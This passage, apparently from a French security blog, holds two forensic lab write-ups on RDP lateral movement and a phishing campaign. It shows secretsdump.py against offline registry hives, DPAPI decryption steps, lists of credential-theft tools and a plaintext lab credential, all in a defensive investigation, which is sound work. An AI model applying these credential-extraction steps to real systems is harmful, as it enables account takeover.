2025","externalUrl":null,"permalink":"/blog-cyber/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"\rSc√©nario #\rLe 28 juin, notre client a d√©tect√© des sessions RDP non autoris√©es, sans d√©ploiement de PAM, dans leur environnement. Ils ont r√©cup√©r√© des preuves sur un serveur qu‚Äôils suspectaient de servir de pivot pour un mouvement lat√©ral vers d‚Äôautres cibles. M√™me si l‚Äôattaquant a supprim√© les events log, je pense que les quelques artefacts restants suffisent √† confirmer le d√©roulement de l‚Äôattaque et √† retracer le comportement de l‚Äôassaillant.\nSetup #\rPour ce Sherlock nous allons utiliser :\nZimmerman Tools (EvtxECmd, Registry Explorer, Timeline Explorer, PECmd, WxTCmd\u0026hellip;) Impacket (secretsdump.py) NirSoft DataProtectionDecryptor ANSSI BMC-tools BSI-Bund RdpCacheStitcher On va aussi s\u0026rsquo;appuyer sur des cheatsheets tels que celle de la FOR500 de SANS et celle portant sur les registres windows de 13Cubed :\nhttps://13cubed.s3.amazonaws.com/downloads/windows_registry_cheat_sheet.pdf\nQuestion 1 #\rQuand a eu lieu la derni√®re tentative de connexion √©chou√©e utilisant l\u0026rsquo;utilisateur emman.t ? (UTC)\nPremi√®rement on va v√©rifier si, comme le sc√©nario l\u0026rsquo;explique, les events logs ont bien √©t√© effac√©s. Pour cela, nous allons utiliser les tools de Zimmerman EvtxECmd et Timeline Explorer afin de r√©pondre √† cette question.\nEvtxECmd.exe -d \u0026#34;C:/C___NONAME [NTFS]\\[root]\\Windows\\System32\\winevt\\Logs\u0026#34; --csv \u0026#34;C:\\Users\\username\\Desktop\\HTB\\latus\u0026#34; On recherche l\u0026rsquo;ID 4625 (Account failed to log on), mais RAS.\nEt effectivement on voit bien que les logs ont √©t√© effac√©s :\nIl nous reste cependant une chance de les retrouver si on dispose de VSS (Volume Shadow Copy).\nLe (VSS) est une fonctionnalit√© Windows qui cr√©e des snapshots de l‚Äô√©tat d‚Äôun disque √† un moment donn√©. Si des VSS sont disponibles, on peut retrouver des versions ant√©rieures de fichiers supprim√©s ou alt√©r√©s, y compris les events log. Donc, m√™me si un attaquant a effac√© les logs sur la machine en live, il est parfois possible de r√©cup√©rer ceux qui existaient au moment o√π le snapshot VSS a √©t√© cr√©√©.\nMalheureusement, apr√®s v√©rification, on n\u0026rsquo;a pas de VSS. On est donc oblig√© de se rediriger sur les Registry.\nPour √ßa nous allons utiliser un autre outil de Zimmerman, Registry Explorer.\nOn va aller voir du c√¥t√© de la registry hive SAM. En effet, on pourra y retrouver des art√©facts dans SAM\\Domains\\Account\\Users tels que :\nlast login time last incorrect password last password change login counts group membership account creation time etc. Pour cela, on va charger le fichier C___NONAME [NTFS]\\[root]\\Windows\\System32\\config\\SAM dans Registry Explorer :\nEt effectivement on retrouve le \u0026ldquo;Last Incorrect Password\u0026rdquo;\nR√©ponse : 2024-06-26 07:24:35\nQuestion 2 #\rQuelles sont les 3 premi√®res adresses IP auxquelles emman.t s\u0026rsquo;est connect√© via Remote Desktop (RDP) ?\nPour r√©pondre √† cette question on va aller regarder du c√¥t√© du NTUSER.dat. C\u0026rsquo;est la registry hive situ√©e dans le dossier de profil de l\u0026rsquo;utilisateur, il contient toutes les configurations personnelles et le pr√©f√©rences de l\u0026rsquo;environnement de bureau.\nLorsqu\u0026rsquo;un utilisateur se connecte, ce fichier est charg√© pour appliquer ses param√®tres sp√©cifiques (les param√®tres d\u0026rsquo;application, l\u0026rsquo;historique des activit√©s, etc.).\nOn va particuli√®rement porter notre attention sur HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client car c\u0026rsquo;est ici que sont stock√©s les param√®tres RDP et la liste des serveurs auxquels l\u0026rsquo;utilisateur s\u0026rsquo;est connect√© via RDP.\nOn charge donc le fichier NTUSER.dat de l\u0026rsquo;utilisateur en question dans Registry Explorer et on se rend au chemin voulu :\nR√©ponse : 192.168.86.250,192.168.25.128,192.168.25.131\nQuestion 3 #\rQuel est le nom d\u0026rsquo;utilisateur de destination utilis√© pour se connecter en Remote Desktop pour la premi√®re fois le 2024-06-20 √† 16:01:05 UTC ?\nOn a d√©j√† la r√©ponse sur le screen de la question 2.\nR√©ponse : tommyxiaomi\nQuestion 4 #\rQuelle est l\u0026rsquo;adresse IP de destination de la derni√®re session Remote Desktop (RDP) ?\nIdem.\nR√©ponse : 192.168.70.133\nQuestion 5 #\remman.t est tr√®s n√©gligent en sauvegardant syst√©matiquement ses identifiants RDP pour se connecter √† d\u0026rsquo;autres h√¥tes, ce qui laisse penser que l\u0026rsquo;attaquant les a, d\u0026rsquo;une mani√®re ou d\u0026rsquo;une autre, divulgu√©s. Pouvez-vous confirmer les identifiants divulgu√©s du serveur avec l\u0026rsquo;IP 192.168.70.133 ?\nCette question est un petit d√©fi tr√®s int√©ressant.\nPremi√®rement, allons droit au but, o√π pouvons-nous trouver les credentials RDP ? Lorsqu\u0026rsquo;on se connecte en RDP via l\u0026rsquo;application de Microsoft par d√©faut, l\u0026rsquo;app nous propose de sauvegarder les credentials :\nPour stocker ces credentials, Windows utilise le syst√®me de Credential Manager pour g√©rer et stocker de mani√®re \u0026ldquo;s√©curis√©e\u0026rdquo;. Lorsque l‚Äôutilisateur sauvegarde ses identifiants lors d‚Äôune connexion RDP, ces credentials sont enregistr√©s dans le dossier sp√©cifique de l‚Äôutilisateur, ici situ√© √† C:\\Users\\emman.t\\AppData\\Local\\Microsoft\\Credentials.\nCredential Manager s\u0026rsquo;appuie sur la DPAPI (Data Protection API) afin de chiffrer les informations d\u0026rsquo;authentifications. L\u0026rsquo;API est tr√®s straightforward :\nDPAPI_IMP BOOL CryptProtectData( [in] DATA_BLOB *pDataIn, [in, optional] LPCWSTR szDataDescr, [in, optional] DATA_BLOB *pOptionalEntropy, [in] PVOID pvReserved, [in, optional] CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, [in] DWORD dwFlags, [out] DATA_BLOB *pDataOut ); Cette API est largement utilis√©e par Microsoft et d\u0026rsquo;autres applications telles que Chrome, Edge etc. afin de stocker des mots de passe et autres secrets en tout genre.\nDPAPI fonctionne en utilisant des cl√©s appel√©es masterkeys. Ces masterkeys servent √† chiffrer les donn√©es prot√©g√©es par DPAPI. Chaque masterkey est elle-m√™me chiffr√©e √† l\u0026rsquo;aide d\u0026rsquo;un d√©riv√© du mot de passe de l\u0026rsquo;utilisateur ou de la cl√© syst√®me DPAPI.\nCes masterkeys sont stock√©es dans :\nPour l\u0026rsquo;utilisateur : C:\\Users\\\u0026lt;user\u0026gt;\\AppData\\Roaming\\Microsoft\\Protect\\\u0026lt;SID\u0026gt; Pour le syst√®me : C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18 Ces masterkeys :\nsont renouvel√©s automatiquement tous les 3 mois ou apr√®s un changement de mot de passe utilisateur. mise en cache (stockage temporaire en clair) dans le processus LSASS (tr√®s utile memory forensic ou alors en pentest) Voici comment fonctionne le m√©canisme DPAPI :\nAu centre, on retrouve la masterkey qui est la cl√© principale utilis√©e par DPAPI pour chiffrer et d√©chiffrer des secrets.\nCette Masterkey est elle-m√™me chiffr√©e et prot√©g√©e. Selon la situation, elle peut √™tre d√©chiffr√©e √† partir de diff√©rentes cl√©s : - Le NT hash du mot de passe utilisateur d\u0026rsquo;un compte de domaine. - Le hash SHA1 du mot de passe d‚Äôun compte utilisateur local. - Une cl√© machine nomm√©e Domain Backup Key, sp√©cifique aux environnements Active Directory, permettant de d√©chiffrer les masterkeys sans avoir le mot de passe utilisateur, si l‚Äôon poss√®de les droits suffisants.\nUne fois la Masterkey d√©chiffr√©e gr√¢ce √† l\u0026rsquo;une de ces cl√©s, elle permet de d√©river une cl√© de session (Session Key), qui est directement utilis√©e pour chiffrer ou d√©chiffrer les donn√©es prot√©g√©es par DPAPI.\nPour d√©chiffrer des donn√©es prot√©g√©es par DPAPI on peut s\u0026rsquo;aider de pas mal de tool :\nutilisable sur un live system : LaZagne pypykatz¬†- dpapi module mimikatz SharpDPAPI offline apr√®s avoir r√©cup√©r√© les fichiers n√©cessaires : pypykatz¬†- dpapi module dpapi.py¬†-¬†impacket mimikatz SharpDPAPI dpapilab-ng diana Si vous souhaitez rentrer davantage dans les d√©tails de la DPAPI, je vous invite √† lire cette publication de Synacktiv (l\u0026rsquo;explication ci-dessus est bas√© sur le post): https://www.synacktiv.com/publications/windows-secrets-extraction-a-summary\nMaintenant qu\u0026rsquo;on sait tout √ßa, comment peut-on l\u0026rsquo;appliquer √† notre situation ? Ici j\u0026rsquo;ai souhait√© partir sur :\nImpacket (secretsdump.py) NirSoft DataProtectionDecryptor Le script secretsdump.py va nous permettre de r√©cup√©rer le mot de passe de l\u0026rsquo;utilisateur en question afin de pouvoir d√©chiffrer les secrets DPAPI :\nsecretsdump.py -sam \u0026#34;C:\\C___NONAME [NTFS]\\[root]\\Windows\\System32\\SAM\u0026#34; --security \u0026#34;C:\\C___NONAME [NTFS]\\[root]\\Windows\\System32\\SECURITY\u0026#34; --system \u0026#34;C:\\C___NONAME [NTFS]\\[root]\\Windows\\System32\\SYSTEM\u0026#34; LOCAL Parfait, on a r√©cup√©r√© le hash du mot de passe de l\u0026rsquo;utilisateur en question, on peut ensuite le bruteforce :\nMaintenant qu\u0026rsquo;on a son mot de passe on peut d√©chiffrer les credentials via l\u0026rsquo;outil DataProtectionDecryptor :\nIl existe aussi une fa√ßon non intentionnel de trouver le mot de passe du user :\nEffectivement, si on va dans l\u0026rsquo;historique des commandes powershell, on peut retrouver le moment ou le cr√©ateur du challenge a cr√©√© les users :\nR√©ponse : Administrator:C@mv@0s3rv3r\nQuestion 6 #\rQuand l\u0026rsquo;application Remote Desktop Connection a-t-elle √©t√© ex√©cut√©e pour la derni√®re fois ? (UTC)\nPour r√©pondre √† cette question on va se pencher sur les art√©facts Prefetch.\nLe Prefetch est un m√©canisme con√ßu pour acc√©l√©rer le lancement des applications couramment utilis√©es en conservant certaines donn√©es relatives aux ex√©cutions pr√©c√©dentes. Windows stocke ces informations sous forme de fichiers .pf dans le dossier suivant C:\\Windows\\Prefetch\\.\nChaque fichier .pf contient notamment :\nle nom de l‚Äôex√©cutable le nombre de fois o√π l\u0026rsquo;application a √©t√© lanc√©e les timestamps de derni√®re ex√©cution les chemins vers les fichiers associ√©s et biblioth√®ques charg√©es durant le d√©marrage du processus Dans le cas d\u0026rsquo;une connexion RDP, l‚Äôex√©cutable utilis√© est g√©n√©ralement MSTSC.EXE. L‚Äôanalyse du fichier Prefetch associ√© (MSTSC.EXE-XXXXXX.pf) permet ainsi de v√©rifier si une connexion RDP a √©t√© √©tablie depuis cette machine, ainsi que le moment pr√©cis de son lancement.\nPour les charger dans Timeline Explorer on doit les parser, pour cela on va utiliser PECmd :\nPECmd.exe -d \u0026#34;C:\\___NONAME [NTFS]\\[root]\\Windows\\Prefetch\u0026#34; --csv \u0026#34;C:\\Users\\username\\Desktop\\HTB\\latus\u0026#34; Et effectivement on retrouve les informations de lancement de MSTSC.exe :\nR√©ponse : 2024-06-28 13:56:48\nQuestion 7 #\rQuand l\u0026rsquo;application Remote Desktop Connection a-t-elle √©t√© ferm√©e pour la derni√®re fois ? (UTC)\nPremi√®rement on va chercher du c√¥t√© du UserAssist (dans la registry hive NTUSER.dat) se situant : NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\.\nCette cl√© conserve l‚Äôhistorique d‚Äôutilisation des applications ex√©cut√©es par l‚Äôutilisateur notamment :\nle nombre d‚Äôex√©cutions d‚Äôun programme le moment pr√©cis de la derni√®re ex√©cution de l\u0026rsquo;application le moment pr√©cis o√π l\u0026rsquo;application a √©t√© ferm√©e ou termin√©e (dernier arr√™t du processus) Ces informations sont stock√©es dans des sous-cl√©s encod√©es via ROT13 mais heureusement Registry Explorer nous rend tout cela lisible :\nMais ce qui nous choque en premier c\u0026rsquo;est la diff√©rence entre la valeur \u0026ldquo;Last Executed\u0026rdquo; contenu dans le UserAssist et la \u0026ldquo;Last Run\u0026rdquo; dans le Prefetch.\nPourquoi cette divergence entre Prefetch et UserAssist ?\nPrefetch (.pf) : Enregistre les ex√©cutions directement au niveau du processus (mstsc.exe). Le compteur augmente √† chaque chargement du processus en m√©moire, peu importe comment il est d√©marr√©. UserAssist (registre) : Enregistre uniquement les ex√©cutions effectu√©es par interaction directe de l‚Äôutilisateur (ex : clic sur l‚Äôic√¥ne, menu D√©marrer, barre de recherche, raccourci). Ne comptabilise pas n√©cessairement les ex√©cutions indirectes (ex√©cution via ligne de commande, ex√©cution automatique, scripts, etc.). Donc on fait fausse route ici.\nOn peut alors se pencher sur la cl√© BAM (HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings\\) qui enregistre explicitement la dur√©e de vie des applications.\nEn effet, BAM maintient pour chaque ex√©cutable un historique pr√©cis comprenant :\nle dernier moment d‚Äôex√©cution (lancement de l‚Äôapplication) le moment pr√©cis de fermeture (terminaison du processus) Vous pouvez retrouver plus d\u0026rsquo;informations sur les art√©facts RDP ici : https://www.thedfirspot.com/post/lateral-movement-remote-desktop-protocol-rdp-artifacts\nR√©ponse : 2024-06-28 14:01:26\nQuestion 8 #\rQuelle a √©t√© la dur√©e de l\u0026rsquo;avant-derni√®re session RDP ?\nPour r√©pondre √† cette question on va se pencher sur l\u0026rsquo;ActivitiesCache.db :\nApr√®s l\u0026rsquo;avoir charg√© dans Timeline Explorer on voit bien les diff√©rentes \u0026ldquo;duration\u0026rdquo; des sessions RDP :\nPour une raison inconnue, la r√©ponse prend -1 sec.\nR√©ponse : 00:11:42\nQuestion 9 #\rQuand l\u0026rsquo;attaquant a-t-il d√©connect√© la derni√®re session Remote Desktop (RDP) ? (UTC)\nPour cela on va aller voir le fichier \u0026ldquo;Default.rdp\u0026rdquo; contenu dans le ...\\Documents\\ de l\u0026rsquo;utilisateur. En effet, ce fichier est g√©n√©r√© automatiquement par Windows lorsqu\u0026rsquo;une connexion RDP est √©tablie via l\u0026rsquo;application MSTSC.\nOn peut y retrouver :\nl\u0026rsquo;adresse IP ou nom du serveur utilis√© lors de la derni√®re connexion RDP le nom d‚Äôutilisateur ayant √©t√© utilis√© pour la connexion le param√®tres graphiques (r√©solution, couleurs, etc.) l\u0026rsquo;options de partage des p√©riph√©riques locaux (presse-papiers, disques locaux, imprimantes, etc.) les param√®tres de performances (qualit√© graphique, compression, etc.). Mais on peut aussi voir quand est-ce que le fichier a √©t√© modifi√© pour la derni√®re fois :\nR√©ponse : 2024-06-28 13:51:03\nQuestion 10 #\rQuelle est la taille du bureau √† distance configur√© ?\nOn retourne sur le fichier Default.rdp et on y retrouve :\nR√©ponse : 1920:1080\nQuestion 11 #\rQuel outil l\u0026rsquo;attaquant a-t-il utilis√© pour explorer le r√©seau apr√®s s\u0026rsquo;√™tre d√©plac√© lat√©ralement vers 192.168.70.133 ?\nPour r√©pondre √† cette question on va devoir chercher du c√¥t√© du cache bitmap RDP.\nLors de l‚Äôanalyse des sessions utilisant le protocole RDP (Remote Desktop Protocol) sous Windows, le cache bitmap RDP constitue un artefact souvent n√©glig√©, mais pourtant tr√®s pertinent en forensic.\nCe cache permet d\u0026rsquo;am√©liorer les performances des sessions RDP en stockant localement des sections d\u0026rsquo;√©cran d√©j√† affich√©es. Ainsi, lorsqu\u0026rsquo;une partie de l\u0026rsquo;√©cran reste statique, le syst√®me peut rapidement r√©cup√©rer l\u0026rsquo;image en m√©moire locale plut√¥t que de la recharger √† distance, ce qui fluidifie l\u0026rsquo;exp√©rience utilisateur.\nD\u0026rsquo;un point de vue forensic, ce cache peut repr√©senter une source pr√©cieuse d\u0026rsquo;informations. En effet, l\u0026rsquo;analyse des fichiers du cache bitmap peut r√©v√©ler des d√©tails sensibles sur les activit√©s de l\u0026rsquo;utilisateur, telles que les fen√™tres ouvertes, les contenus affich√©s ou les actions r√©alis√©es pendant la session RDP.\nSi vous voulez plus d\u0026rsquo;informations je vous invite √† lire le post : https://www.cyberengage.org/post/analyzing-and-extracting-bitmap-cache-files-from-rdp-sessions.\nOn retrouve ces fichiers ici C:\\Users\\user\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\.\nPour les parser \u0026amp; exporter on va utiliser le tool de l\u0026rsquo;ANSSI \u0026ldquo;BMC-Tools\u0026rdquo;.\nEnsuite, on va utiliser le tool de la BSI Bund \u0026ldquo;RdpCacheStitcher\u0026rdquo; pour les analyser :\nEn reconstruisant, on voit donc bien que l\u0026rsquo;attaquant a utilis√© \u0026ldquo;NetBScanner\u0026rdquo; pour scanner le r√©seau.\nR√©ponse : NetBScanner\nQuestion 12 #\rQuand l\u0026rsquo;attaquant a-t-il supprim√© le journal des √©v√©nements ? (UTC)\nOn revient sur ce qu\u0026rsquo;on avait trouv√© lors de la question 1 :\nR√©ponse : 2024-06-28 14:03:25\nQuestion 13 #\r√Ä quelle heure l\u0026rsquo;attaquant a-t-il d√©connect√© la session vers 192.168.70.129 ? (UTC)\nSi on regarde juste apr√®s l\u0026rsquo;effacement des events log, on voit bien un \u0026ldquo;An account was logged off\u0026rdquo; :\nR√©ponse : 2024-06-28 14:03:53\nLab termin√© !\n","date":"10 mars 2025","externalUrl":null,"permalink":"/blog-cyber/posts/latus/","section":"Posts","summary":"Sc√©nario #\rLe 28 juin, notre client a d√©tect√© des sessions RDP non autoris√©es, sans d√©ploiement de PAM, dans leur environnement.","title":"Latus","type":"posts"},{"content":"","date":"2 mars 2025","externalUrl":null,"permalink":"/blog-cyber/tags/cyberdefenders/","section":"Tags","summary":"","title":"Cyberdefenders","type":"tags"},{"content":"\rSc√©nario #\rUn employ√© informatique d‚ÄôInfiniTech Solutions a signal√© une activit√© inhabituelle associ√©e √† son compte e-mail. Lors de l‚Äôinvestigation, il a √©t√© d√©couvert que les identifiants professionnels de l‚Äôemploy√© avaient √©t√© divulgu√©s lors d‚Äôune r√©cente fuite de donn√©es.\nL‚Äôemploy√© avait utilis√© son adresse mail professionnelle pour s‚Äôinscrire sur une plateforme tierce, ce qui a expos√© ses identifiants. Des acteurs malveillants ont exploit√© ces identifiants pour se connecter au compte mail de l‚Äôemploy√© et envoyer des e-mails de phishing √† d‚Äôautres employ√©s de l‚Äôorganisation.\nVotre t√¢che est d‚Äôenqu√™ter sur cet incident en analysant les logs, en d√©terminant l‚Äô√©tendue de l‚Äôattaque, en identifiant si des utilisateurs ont interagi avec les mails de phishing, et en d√©couvrant l‚Äôimpact de la campagne de phishing sur le r√©seau.\nSetup #\rPour ce sc√©nario d\u0026rsquo;investigation, nous allons principalement utiliser Splunk Search pour analyser les logs. En compl√©ment, nous utiliserons d‚Äôautres outils tels que xml.onlineviewer, Cyberchef ainsi que VirusTotal.\nRappels #\rSplunk est une plateforme d‚Äôanalyse qui permet de collecter, indexer et rechercher des donn√©es g√©n√©r√©es par des syst√®mes, applications et √©quipements r√©seau. Il r√©cup√®re ses logs via divers m√©canismes tels que des agents install√©s sur les endpoints, l‚Äôingestion de fichiers de logs ou encore des API.\nUne fois collect√©es, les donn√©es sont index√©es, ce qui permet de les organiser et de faciliter la recherche. Splunk utilise le langage de recherche SPL (Search Processing Language) pour interroger ces donn√©es.\nInitial Access #\rQuestion 1 #\rQuel compte de messagerie a √©t√© compromis et utilis√© pour lancer l\u0026rsquo;attaque ?\nPremi√®rement, v√©rifions les \u0026ldquo;sourcetype\u0026rdquo; disponibles sur notre\nindex=\u0026#34;main\u0026#34; | stats count by sourcetype Les sourcetypes dans Splunk sont des √©tiquettes qui indiquent le type de donn√©es ou l\u0026rsquo;origine des √©v√©nements collect√©s.\nPour r√©pondre √† cette question, on va se focus sur les \u0026ldquo;syslog\u0026rdquo; premi√®rement. En effet, les syslog regroupent les logs g√©n√©r√©s par divers √©quipements et contiennent g√©n√©ralement des informations d√©taill√©es sur les activit√©s syst√®me et de s√©curit√©.\nPour aller plus vite et √©viter de s\u0026rsquo;inonder d\u0026rsquo;informations, on va chercher avec un regex pour uniquement afficher les adresses mails :\n* sourcetype=syslog | regex _raw=\u0026#34;[\\w\\.-]+@[\\w\\.-]+\\.\\w+\u0026#34; On voit beaucoup de logs, pour nous faciliter la t√¢che, on va compter combien de fois chaque adresse mail appara√Æt et afficher les r√©sultats sous forme de tableau :\n* sourcetype=syslog | rex field=_raw \u0026#34;(?\u0026lt;email\u0026gt;[\\w\\.-]+@[\\w\\.-]+\\.\\w+)\u0026#34; | stats count by email | sort -count | head 10 | rename count AS \u0026#34;Number of occurrences\u0026#34;, email AS \u0026#34;Email address\u0026#34; On peut m√™me visualiser √ßa sous forme de graphique :\nR√©ponse : twhite@infinitechsolutions.xyz\nQuestion 2 #\rApr√®s avoir identifi√© le compte compromis, l\u0026rsquo;attaquant a envoy√© des mails de phishing √† d\u0026rsquo;autres employ√©s de l\u0026rsquo;entreprise. Quels sont les noms de ces employ√©s, class√©s par ordre chronologique et s√©par√©s par des virgules ?\nLe formatage de log d\u0026rsquo;envoi de mail est comme cela :\nUser [email_exp√©diteur] [adresse_IP]; Message [ID_message] for [email_destinataire] Pour la recherche on va donc faire :\n* sourcetype=syslog \u0026#34;User twhite@infinitechsolutions.xyz\u0026#34; | rex field=_raw \u0026#34;Message \u0026lt;[^\u0026gt;]+\u0026gt; for (?\u0026lt;recipient\u0026gt;[\\w\\.-]+@[\\w\\.-]+\\.\\w+)\u0026#34; | table _time recipient | sort _time | stats list(recipient) as recipients | eval recipients=mvjoin(recipients, \u0026#34;, \u0026#34;) Cette requ√™te nous permet d\u0026rsquo;identifier et lister chronologiquement les destinataires en question.\nEn effet, on y s√©lectionne le user du compte compromis et on utilise un regex pour extraire et stocker dans une variable l\u0026rsquo;adresse mail du destinataire.\nEnsuite, on trie les r√©sultats par ordre chronologique et on format le r√©sultat pour que √ßa soit bien lisible.\nR√©ponse : rnichols,llopez,gbaker,ahall\nQuestion 3 #\rQuel est le nom de la pi√®ce jointe malveillante envoy√©e depuis le compte compromis ?\nCette question m\u0026rsquo;a pos√© plus de probl√®me que ce que √† quoi je m\u0026rsquo;attendais. En effet, premi√®rement j\u0026rsquo;ai cherch√© :\n* sourcetype=syslog \u0026#34;User twhite@infinitechsolutions.xyz\u0026#34; | regex _raw=\u0026#34;for (rnichols|llopez|gbaker|ahall)@infinitechsolutions\\.xyz\u0026#34; N√©anmoins aucune trace de pi√®ce jointe. Je me suis donc dit \u0026ldquo;mhmm je ne dois pas √™tre sur le bon sourcetype, je vais rechercher les autres.\u0026rdquo;\nJ\u0026rsquo;ai donc recherch√© :\nindex=* \u0026#34;twhite@infinitechsolutions.xyz\u0026#34; | stats count by sourcetype Uniquement syslog, je suis donc sur le bon sourcetype. Je continue donc √† r√©fl√©chir et je me dis \u0026ldquo;je vais bypass le probl√®me de formatage et simplement chercher des extensions de fichier\u0026rdquo;\nJe demande donc √† ChatGPT de me faire une liste d\u0026rsquo;extension et je me retrouve avec cette requ√™te :\nindex=* sourcetype=syslog twhite@infinitechsolutions.xyz | rex field=_raw \u0026#34;attachment=(?\u0026lt;malicious_attachment\u0026gt;[\\w\\.-]+\\.(exe|zip|pdf|docx|xlsm|js|vbs|scr|bat))\u0026#34; | table _time malicious_attachment | sort _time Toujours rien, pas de pi√®ce jointe.\n√âtant toujours bloqu√©, j\u0026rsquo;ai d√©cid√© de r√©fl√©chir diff√©remment. Le titre du lab est \u0026ldquo;Midnight RDP\u0026rdquo;, ce qui me fait penser √† l\u0026rsquo;APT nomm√©e \u0026ldquo;Midnight Blizzard\u0026rdquo;.\nDans mes recherches, je suis tomb√© sur un article intitul√© \u0026ldquo;How Midnight Blizzard Uses Malicious .RDP Files to Exploit Windows Systems: A Technical Guide\u0026rdquo; (Yua Mikanana).\nBon, au vu du nom du lab, c\u0026rsquo;est √©vident. Je cherche donc \u0026ldquo;.RDP\u0026rdquo; et j\u0026rsquo;obtiens le fichier :\nR√©ponse : cloud zerotrust compliance.rdp\nExecution #\rQuestion 1 #\rApr√®s avoir analys√© les interactions des utilisateurs, quel employ√© a t√©l√©charg√© et ex√©cut√© la pi√®ce jointe malveillante ?\nOn change de sourcetype, on passe sur les WinEventLog.\nLes WinEventLog correspondent aux journaux d\u0026rsquo;√©v√©nements de Windows, qui enregistrent diverses activit√©s du syst√®me (comme les erreurs, les avertissements, les informations de s√©curit√© ou les activit√©s applicatives) pour permettre un suivi et une analyse des √©v√©nements sur un syst√®me Windows.\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; cloud zerotrust compliance.rdp On voit donc bien le username de l\u0026rsquo;utilisateur qui a t√©l√©charg√© ce fichier : C:\\Users\\rnichols\\Downloads\\cloud zerotrust compliance.rdp\nR√©ponse : rnichols\nQuestion 2 #\rSur la machine DC, une balise DLL a √©t√© ex√©cut√©e par l\u0026rsquo;attaquant en m√©moire. Quels sont les 10 premiers octets du hachage SHA-256 de ce fichier DLL malveillant ?\nPremi√®rement, listons les DLL ayant un lien avec PowerShell sur le DC :\nindex=* sourcetype=xmlwineventlog \u0026#34;Powershell\u0026#34; | search host=\u0026#34;DC01\u0026#34; | rex field=_raw \u0026#34;(?\u0026lt;file\u0026gt;\\b\\w{6,8}\\.\\w{3}\\b)\u0026#34; | search file=\u0026#34;*dll\u0026#34; On remarque que le script complet est trop long pour √™tre enregistr√© en un seul √©v√©nement. Il est donc d√©coup√© en segments. On peut le voir gr√¢ce au MessageNumber :\nLes deux √©v√©nements partagent le m√™me ActivityID {0B39225B-3C43-0001-5078-390B433CDB01} ainsi que d‚Äôautres identifiants, ce qui montre qu‚Äôils appartiennent √† la m√™me ex√©cution de script.\nLe premier segment (MessageNumber = 1) contient le d√©but du script, incluant la configuration de l‚Äôenvironnement PowerShell et la d√©finition de fonctions telles que func_get_proc_address et func_get_delegate_type.\nLe dernier segment (MessageNumber = 33) contient la fin du script, notamment la partie qui effectue le d√©codage d‚Äôune cha√Æne Base64 (XOR√©e avec la cl√© 35) et qui alloue de la m√©moire pour ex√©cuter le code d√©cod√©.\nEnsemble, ces segments reconstituent l‚Äôint√©gralit√© d‚Äôun payload qui cherche vraisemblablement √† injecter et ex√©cuter du code en m√©moire.\nLe script, une fois reconstitu√©, d√©code un payload obfusqu√© (d‚Äôabord en Base64, puis XOR√© avec 35) et utilise des fonctions Windows natives (comme VirtualAlloc via GetProcAddress et GetDelegateForFunctionPointer) pour allouer de la m√©moire et ex√©cuter le code malveillant.\n[...] $var [...] -bxor 35 [...] On peut le reconstituer via une recherche Splunk :\nindex=* sourcetype=xmlwineventlog EventID=4104 0B39225B-3C43-0001-5078-390B433CDB01 | stats values(ScriptBlockText) as Script by SystemTime | table Script On peut ensuite d√©sencoder le script via Cyberchef :\nOn retrouve notre DLL en question :\nEnfin, on extrait le fichier et on r√©cup√®re son hash :\nR√©ponse : 0ee6bc20a7f855d881cce962de09c77960ea5c85ca013e3d123fce61109ff8c5\nPersistence #\rQuestion 1 #\rApr√®s l\u0026rsquo;√©tablissement de la connexion malveillante, un fichier a √©t√© d√©pos√© sur le syst√®me. Quel est le nom de ce fichier d√©pos√© ?\nOn sait que le fichier .rdp a √©t√© ex√©cut√© vers 20:45:27 (cf. question 1 de la partie Execution).\nOn va donc chercher √† partir de ce moment-l√†.\nPremi√®rement, j\u0026rsquo;ai tent√© de rechercher dans Splunk des t√©l√©chargements via des commandes PowerShell (Invoke-WebRequest, curl, etc.), mais √ßa n\u0026rsquo;a rien donn√©.\nJ\u0026rsquo;ai donc modifi√© ma recherche :\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; \u0026#34;rnichols\u0026#34; | rex field=_raw \u0026#34;CommandLine=(?\u0026lt;CommandLine\u0026gt;.*)\u0026#34; | fillnull value=\u0026#34;\u0026#34; | search NOT CommandLine=\u0026#34;\u0026lt;/Data\u0026gt;\u0026lt;/EventData\u0026gt;\u0026lt;/Event\u0026gt;\u0026#34;,\u0026#34;\u0026#34; | stats values(CommandLine) as CommandLine by _time, ParentCommandLine | sort ‚Äî _time Alors pourquoi cela fonctionne ?\nVoici le d√©tail de l‚Äô√©v√©nement :\nLe champ TerminalSessionId=3 sugg√®re fortement que l\u0026rsquo;utilisateur √©tait connect√© via une session RDP, car :\nLa session 0 est souvent utilis√©e par SYSTEM. Les sessions interactives locales commencent g√©n√©ralement √† 1. Les sessions RDP prennent souvent des ID plus √©lev√©s (2, 3, etc.). explorer.exe est le processus principal de l‚Äôinterface graphique Windows et agit comme un lanceur pour les programmes d√©marr√©s par un utilisateur interactif.\nSc√©narios possibles expliquant ce comportement :\nSession interactive (RDP ou non) : Si rnichols s\u0026rsquo;est connect√© via RDP, explorer.exe s‚Äôest lanc√© en tant que shell utilisateur et a ex√©cut√© les programmes d√©finis dans Startup (ztssvc.exe). Cette situation se produit m√™me sans RDP si l‚Äôutilisateur se connecte physiquement ou via un service comme runas. Ex√©cution automatique au d√©marrage de l\u0026rsquo;utilisateur : ztssvc.exe √©tant dans Startup, il est ex√©cut√© d√®s que l\u0026rsquo;utilisateur se connecte (que ce soit en local ou via RDP). Injection ou Persistance via explorer.exe : Si un attaquant a persist√© un malware via Startup, explorer.exe va automatiquement ex√©cuter ce binaire d√®s qu\u0026rsquo;un utilisateur se connecte. Exploit ou Ex√©cution forc√©e par un attaquant : Si explorer.exe a √©t√© compromis (via injection DLL ou autre technique), il aurait pu √™tre utilis√© pour ex√©cuter ztssvc.exe. R√©ponse : ztssvc.exe\nQuestion 2 #\rPour conserver un acc√®s √† long terme, l\u0026rsquo;attaquant a cr√©√© une t√¢che planifi√©e sur la machine compromise. Quel est le nom de cette t√¢che ?\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; EventCode=4698 OR EventCode=4702 | search user=\u0026#34;rnichols\u0026#34; | table _time EventCode TaskName Command User | rename EventCode as 